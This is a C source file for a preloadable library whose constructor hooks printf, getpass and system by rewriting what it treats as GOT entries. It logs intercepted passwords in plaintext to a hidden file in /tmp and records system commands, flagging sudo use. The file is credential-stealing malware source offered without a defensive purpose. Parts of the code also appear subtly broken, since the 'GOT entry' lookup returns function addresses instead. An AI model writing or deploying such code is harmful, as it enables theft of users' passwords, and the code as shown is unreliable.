#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <link.h>
#include <elf.h>

#define LOG_FILE "/tmp/.got_hijack.log"

static int (*original_printf)(const char *format, ...) = NULL;
static char* (*original_getpass)(const char *prompt) = NULL;
static int (*original_system)(const char *command) = NULL;

void log_message(const char* message) {
    FILE* log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "[GOT_HIJACK] %s\n", message);
        fclose(log);
    }
}

int hijacked_printf(const char *format, ...) {
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    
    if (strstr(buffer, "password") || strstr(buffer, "Password")) {
        log_message("Password prompt detected");
    }
    
    if (original_printf) {
        return original_printf("%s", buffer);
    }
    return 0;
}

char* hijacked_getpass(const char *prompt) {
    log_message("getpass() called - credential interception active");
    
    if (original_getpass) {
        char* password = original_getpass(prompt);
        if (password) {
            FILE* cred_log = fopen("/tmp/.credentials.log", "a");
            if (cred_log) {
                fprintf(cred_log, "GETPASS: %s\n", password);
                fclose(cred_log);
            }
        }
        return password;
    }
    return NULL;
}

int hijacked_system(const char *command) {
    char log_msg[512];
    snprintf(log_msg, sizeof(log_msg), "system() called: %.400s", command);
    log_message(log_msg);
    
    if (strstr(command, "sudo") || strstr(command, "su ")) {
        log_message("Privileged command detected");
    }
    
    if (original_system) {
        return original_system(command);
    }
    return 0;
}

void* find_got_entry(const char* symbol_name) {
    void* handle = dlopen(NULL, RTLD_LAZY);
    if (!handle) {
        return NULL;
    }
    
    void* symbol = dlsym(handle, symbol_name);
    dlclose(handle);
    return symbol;
}

int modify_got_entry(void* got_entry, void* new_address) {
    size_t page_size = sysconf(_SC_PAGESIZE);
    void* page_start = (void*)((uintptr_t)got_entry & ~(page_size - 1));
    
    if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE) != 0) {
        return -1;
    }
    
    *(void**)got_entry = new_address;
    
    mprotect(page_start, page_size, PROT_READ);
    return 0;
}

void hijack_got_entries() {
    log_message("Starting GOT hijacking");
    
    original_printf = dlsym(RTLD_DEFAULT, "printf");
    original_getpass = dlsym(RTLD_DEFAULT, "getpass");
    original_system = dlsym(RTLD_DEFAULT, "system");
    
    void* printf_got = find_got_entry("printf");
    void* getpass_got = find_got_entry("getpass");
    void* system_got = find_got_entry("system");
    
    if (printf_got) {
        if (modify_got_entry(printf_got, hijacked_printf) == 0) {
            log_message("printf GOT entry hijacked");
        }
    }
    
    if (getpass_got) {
        if (modify_got_entry(getpass_got, hijacked_getpass) == 0) {
            log_message("getpass GOT entry hijacked");
        }
    }
    
    if (system_got) {
        if (modify_got_entry(system_got, hijacked_system) == 0) {
            log_message("system GOT entry hijacked");
        }
    }
}

__attribute__((constructor))
void init_hijacker() {
    hijack_got_entries();
}